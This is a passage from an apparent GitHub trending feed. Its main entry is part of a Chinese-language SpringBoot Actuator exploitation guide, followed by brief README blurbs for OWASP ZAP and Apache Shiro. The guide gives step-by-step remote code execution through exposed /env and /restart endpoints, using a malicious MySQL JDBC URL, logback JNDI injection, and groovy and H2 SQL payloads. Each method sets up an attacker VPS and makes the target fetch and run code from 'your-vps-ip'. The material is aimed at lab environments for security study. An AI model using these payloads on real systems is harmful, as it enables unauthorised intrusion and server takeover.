&#xA;&lt;pre&gt;&lt;code&gt;POST /refresh&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/refresh&#xA;Content-Type: application/json&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤五：触发数据库查询&lt;/h5&gt; &#xA;&lt;p&gt;尝试访问网站已知的数据库查询的接口，例如： &lt;code&gt;/product/list&lt;/code&gt; ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发&lt;/p&gt; &#xA;&lt;h5&gt;步骤六：恢复正常 jdbc url&lt;/h5&gt; &#xA;&lt;p&gt;反序列化漏洞利用完成后，使用 &lt;strong&gt;步骤三&lt;/strong&gt; 的方法恢复 &lt;strong&gt;步骤一&lt;/strong&gt; 中记录的 &lt;code&gt;spring.datasource.url&lt;/code&gt; 的原始 &lt;code&gt;value&lt;/code&gt; 值&lt;/p&gt; &#xA;&lt;h4&gt;漏洞原理：&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址&lt;/li&gt; &#xA; &lt;li&gt;refresh 刷新后设置了一个新的 spring.datasource.url 属性值&lt;/li&gt; &#xA; &lt;li&gt;当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接&lt;/li&gt; &#xA; &lt;li&gt;然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据&lt;/li&gt; &#xA; &lt;li&gt;目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;漏洞分析：&lt;/h4&gt; &#xA;&lt;p&gt;​ &lt;a href=&#34;https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf&#34;&gt;New-Exploit-Technique-In-Java-Deserialization-Attack&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce&#34;&gt;repository/springboot-mysql-jdbc-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9097/actuator/env&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;发送完 payload 后触发漏洞：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9097/product/list&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x09：restart logging.config logback JNDI RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/restart&lt;/code&gt; 接口重启应用&lt;/li&gt; &#xA; &lt;li&gt;普通 JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过&lt;/li&gt; &#xA; &lt;li&gt;⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出&lt;/li&gt; &#xA; &lt;li&gt;⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出&lt;/li&gt; &#xA; &lt;li&gt;⚠️ JNDI 服务返回的 object 需要实现 &lt;code&gt;javax.naming.spi.ObjectFactory&lt;/code&gt; 接口，否则会导致程序异常退出&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一：托管 xml 文件&lt;/h5&gt; &#xA;&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 使用 python 快速开启 http server&#xA;&#xA;python2 -m SimpleHTTPServer 80&#xA;python3 -m http.server 80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在根目录放置以 &lt;code&gt;xml&lt;/code&gt; 结尾的 &lt;code&gt;example.xml&lt;/code&gt; 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;configuration&amp;gt;&#xA;  &amp;lt;insertFromJNDI env-entry-name=&#34;ldap://your-vps-ip:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y&#34; as=&#34;appName&#34; /&amp;gt;&#xA;&amp;lt;/configuration&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤二：托管恶意 ldap 服务及代码&lt;/h5&gt; &#xA;&lt;p&gt;参考&lt;a href=&#34;https://landgrey.me/blog/21/&#34;&gt;文章&lt;/a&gt;，修改 &lt;a href=&#34;https://github.com/feihong-cs/JNDIExploit&#34;&gt;JNDIExploit&lt;/a&gt; 并启动（也可以使用其他方法）：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤三：设置 logging.config 属性&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /env&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;logging.config=http://your-vps-ip/example.xml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/env&#xA;Content-Type: application/json&#xA;&#xA;{&#34;name&#34;:&#34;logging.config&#34;,&#34;value&#34;:&#34;http://your-vps-ip/example.xml&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤四：重启应用&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /restart&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/restart&#xA;Content-Type: application/json&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;漏洞原理：&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址&lt;/li&gt; &#xA; &lt;li&gt;restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容&lt;/li&gt; &#xA; &lt;li&gt;目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)&lt;/li&gt; &#xA; &lt;li&gt;xml 文件中利用 &lt;code&gt;logback&lt;/code&gt; 依赖的 &lt;code&gt;insertFormJNDI&lt;/code&gt; 标签，设置了外部 JNDI 服务器地址&lt;/li&gt; &#xA; &lt;li&gt;目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;漏洞分析：&lt;/h4&gt; &#xA;&lt;p&gt;​ &lt;a href=&#34;https://xz.aliyun.com/t/4258&#34;&gt;spring boot actuator rce via jolokia&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;​ &lt;a href=&#34;https://landgrey.me/blog/21/&#34;&gt;https://landgrey.me/blog/21/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce&#34;&gt;repository/springboot-restart-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9098/actuator/env&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x0A：restart logging.config groovy RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/restart&lt;/code&gt; 接口重启应用&lt;/li&gt; &#xA; &lt;li&gt;⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出&lt;/li&gt; &#xA; &lt;li&gt;⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出&lt;/li&gt; &#xA; &lt;li&gt;⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一：托管 groovy 文件&lt;/h5&gt; &#xA;&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 使用 python 快速开启 http server&#xA;&#xA;python2 -m SimpleHTTPServer 80&#xA;python3 -m http.server 80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在根目录放置以 &lt;code&gt;groovy&lt;/code&gt; 结尾的 &lt;code&gt;example.groovy&lt;/code&gt; 文件，内容为需要执行的 groovy 代码，比如：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;Runtime.getRuntime().exec(&#34;open -a Calculator&#34;)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤二：设置 logging.config 属性&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /env&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;logging.config=http://your-vps-ip/example.groovy&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/env&#xA;Content-Type: application/json&#xA;&#xA;{&#34;name&#34;:&#34;logging.config&#34;,&#34;value&#34;:&#34;http://your-vps-ip/example.groovy&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤三：重启应用&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /restart&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/restart&#xA;Content-Type: application/json&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;漏洞原理：&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址&lt;/li&gt; &#xA; &lt;li&gt;restart 重启应用后，程序会请求设置的 URL 地址&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;logback-classic&lt;/code&gt; 组件的 &lt;code&gt;ch.qos.logback.classic.util.ContextInitializer.java&lt;/code&gt; 代码文件逻辑中会判断 url 是否以 &lt;code&gt;groovy&lt;/code&gt; 结尾&lt;/li&gt; &#xA; &lt;li&gt;如果 url 以 &lt;code&gt;groovy&lt;/code&gt; 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce&#34;&gt;repository/springboot-restart-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9098/actuator/env&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x0B：restart spring.main.sources groovy RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/restart&lt;/code&gt; 接口重启应用&lt;/li&gt; &#xA; &lt;li&gt;⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出&lt;/li&gt; &#xA; &lt;li&gt;⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出&lt;/li&gt; &#xA; &lt;li&gt;⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一：托管 groovy 文件&lt;/h5&gt; &#xA;&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 使用 python 快速开启 http server&#xA;&#xA;python2 -m SimpleHTTPServer 80&#xA;python3 -m http.server 80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在根目录放置以 &lt;code&gt;groovy&lt;/code&gt; 结尾的 &lt;code&gt;example.groovy&lt;/code&gt; 文件，内容为需要执行的 groovy 代码，比如：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;Runtime.getRuntime().exec(&#34;open -a Calculator&#34;)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤二：设置 spring.main.sources 属性&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /env&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;spring.main.sources=http://your-vps-ip/example.groovy&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/env&#xA;Content-Type: application/json&#xA;&#xA;{&#34;name&#34;:&#34;spring.main.sources&#34;,&#34;value&#34;:&#34;http://your-vps-ip/example.groovy&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤三：重启应用&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /restart&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/restart&#xA;Content-Type: application/json&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;漏洞原理：&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址&lt;/li&gt; &#xA; &lt;li&gt;restart 重启应用后，程序会请求设置的 URL 地址&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;spring-boot&lt;/code&gt; 组件中的 &lt;code&gt;org.springframework.boot.BeanDefinitionLoader.java&lt;/code&gt; 文件代码逻辑中会判断 url 是否以 &lt;code&gt;.groovy&lt;/code&gt; 结尾&lt;/li&gt; &#xA; &lt;li&gt;如果 url 以 &lt;code&gt;.groovy&lt;/code&gt; 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce&#34;&gt;repository/springboot-restart-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9098/actuator/env&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;0x0C：restart spring.datasource.data h2 database RCE&lt;/h3&gt; &#xA;&lt;h4&gt;利用条件：&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt; &#xA; &lt;li&gt;可以 POST 请求目标网站的 &lt;code&gt;/restart&lt;/code&gt; 接口重启应用&lt;/li&gt; &#xA; &lt;li&gt;环境中需要存在 &lt;code&gt;h2database&lt;/code&gt;、&lt;code&gt;spring-boot-starter-data-jpa&lt;/code&gt; 相关依赖&lt;/li&gt; &#xA; &lt;li&gt;⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出&lt;/li&gt; &#xA; &lt;li&gt;⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;利用方法：&lt;/h4&gt; &#xA;&lt;h5&gt;步骤一：托管 sql 文件&lt;/h5&gt; &#xA;&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 使用 python 快速开启 http server&#xA;&#xA;python2 -m SimpleHTTPServer 80&#xA;python3 -m http.server 80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;⚠️ 下面payload 中的 &#39;T5&#39; 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception{Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]{m1,m2,m3});}&#39;);CALL T5(&#39;/bin/bash&#39;,&#39;-c&#39;,&#39;open -a Calculator&#39;);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤二：设置 spring.datasource.data 属性&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /env&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;spring.datasource.data=http://your-vps-ip/example.sql&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/env&#xA;Content-Type: application/json&#xA;&#xA;{&#34;name&#34;:&#34;spring.datasource.data&#34;,&#34;value&#34;:&#34;http://your-vps-ip/example.sql&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;步骤三：重启应用&lt;/h5&gt; &#xA;&lt;p&gt;spring 1.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /restart&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;spring 2.x&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;POST /actuator/restart&#xA;Content-Type: application/json&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;漏洞原理：&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址&lt;/li&gt; &#xA; &lt;li&gt;restart 重启应用后，程序会请求设置的 URL 地址&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;spring-boot-autoconfigure&lt;/code&gt; 组件中的 &lt;code&gt;org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java&lt;/code&gt; 文件代码逻辑中会使用 &lt;code&gt;runScripts&lt;/code&gt; 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;漏洞环境：&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce&#34;&gt;repository/springboot-restart-rce&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;正常访问：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://127.0.0.1:9098/actuator/env&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>zaproxy/zaproxy</title>
    <updated>2022-09-29T01:34:56Z</updated>
    <id>tag:github.com,2022-09-29:/zaproxy/zaproxy</id>
    <link href="https://github.com/zaproxy/zaproxy" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The OWASP ZAP core project&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;&lt;a href=&#34;https://www.zaproxy.org&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wiki/zaproxy/zaproxy/images/zap32x32.png&#34; alt=&#34;&#34;&gt; OWASP ZAP&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.apache.org/licenses/LICENSE-2.0.html&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-Apache%202-4EB1BA.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.zaproxy.org/download/&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/release/zaproxy/zaproxy.svg?sanitize=true&#34; alt=&#34;GitHub release&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/zaproxy/zaproxy/actions/workflows/ci.yml&#34;&gt;&lt;img src=&#34;https://github.com/zaproxy/zaproxy/actions/workflows/ci.yml/badge.svg?sanitize=true&#34; alt=&#34;Java CI&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://bestpractices.coreinfrastructure.org/projects/24&#34;&gt;&lt;img src=&#34;https://bestpractices.coreinfrastructure.org/projects/24/badge&#34; alt=&#34;CII Best Practices&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://zapbot.github.io/zap-mgmt-scripts/downloads.html&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/downloads/zaproxy/zaproxy/latest/total.svg?maxAge=2592000&#34; alt=&#34;Github Releases&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://javadoc.io/doc/org.zaproxy/zap&#34;&gt;&lt;img src=&#34;https://javadoc.io/badge2/org.zaproxy/zap/javadoc.svg?sanitize=true&#34; alt=&#34;javadoc&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://owasp.org/projects#div-flagships&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/owasp-flagship-brightgreen.svg?sanitize=true&#34; alt=&#34;OWASP Flagship&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://lgtm.com/projects/g/zaproxy/zaproxy/context:java&#34;&gt;&lt;img src=&#34;https://img.shields.io/lgtm/grade/java/g/zaproxy/zaproxy.svg?logo=lgtm&amp;amp;logoWidth=18&#34; alt=&#34;Language grade: Java&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://sonarcloud.io/dashboard?id=zaproxy_zaproxy&#34;&gt;&lt;img src=&#34;https://sonarcloud.io/api/project_badges/measure?project=zaproxy_zaproxy&amp;amp;metric=alert_status&#34; alt=&#34;Quality Gate Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.codetriage.com/zaproxy/zaproxy&#34;&gt;&lt;img src=&#34;https://www.codetriage.com/zaproxy/zaproxy/badges/users.svg?sanitize=true&#34; alt=&#34;Open Source Helpers&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/zaproxy&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/zaproxy.svg?style=social&amp;amp;label=Follow&amp;amp;maxAge=2592000&#34; alt=&#34;Twitter Follow&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;The OWASP Zed Attack Proxy (ZAP) is one of the world’s most popular free security tools and is actively maintained by a dedicated international team of volunteers. It can help you automatically find security vulnerabilities in your web applications while you are developing and testing your applications. It&#39;s also a great tool for experienced pentesters to use for manual security testing.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.zaproxy.org/download/&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wiki/zaproxy/zaproxy/images/ZAP-Download.png&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For more details about ZAP see the new ZAP website at &lt;a href=&#34;https://www.zaproxy.org/&#34;&gt;zaproxy.org&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.zaproxy.org/&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wiki/zaproxy/zaproxy/images/zap-website.png&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>apache/shiro</title>
    <updated>2022-09-29T01:34:56Z</updated>
    <id>tag:github.com,2022-09-29:/apache/shiro</id>
    <link href="https://github.com/apache/shiro" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Apache Shiro&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;http://shiro.apache.org&#34;&gt;&lt;img src=&#34;http://shiro.apache.org/assets/images/apache-shiro-logo.png&#34; align=&#34;right&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;&#34;&gt;&lt;img src=&#34;https://img.shields.io/maven-central/v/org.apache.shiro/shiro-core.svg?sanitize=true&#34; alt=&#34;Maven Central&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://ci-builds.apache.org/job/Shiro/job/Shiro-all/job/main/&#34;&gt;&lt;img src=&#34;https://ci-builds.apache.org/buildStatus/icon?job=Shiro%2FShiro-all%2Fmain&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Apache Shiro&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://shiro.apache.org&#34;&gt;Apache Shiro&lt;/a&gt; is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. With Shiro’s easy-to-understand API, you can quickly and easily secure any application – from the smallest mobile applications to the largest web and enterprise applications.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation and Examples&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://shiro.apache.org&#34;&gt;http://shiro.apache.org&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Tutorials&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://shiro.apache.org/10-minute-tutorial.html&#34;&gt;10 Minute Tutorial&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://shiro.apache.org/webapp-tutorial.html&#34;&gt;Web Application&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.apache.org/licenses/LICENSE-2.0.txt&#34;&gt;Apache License, Version 2.0&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>